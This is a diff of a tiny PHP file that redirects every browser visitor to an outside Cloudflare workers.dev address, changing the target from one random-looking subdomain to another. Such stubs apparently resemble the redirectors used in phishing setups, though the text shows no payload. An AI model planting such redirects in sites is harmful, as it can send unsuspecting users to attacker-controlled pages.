@@ -1,5 +1,5 @@
 <?php
 //Redirect Browser
-header("Location: https://dry-river-f72c.batweb00.workers.dev/");
+header("Location: https://delicate-hat-b0c1.sorond47.workers.dev/");
 exit();
 ?>
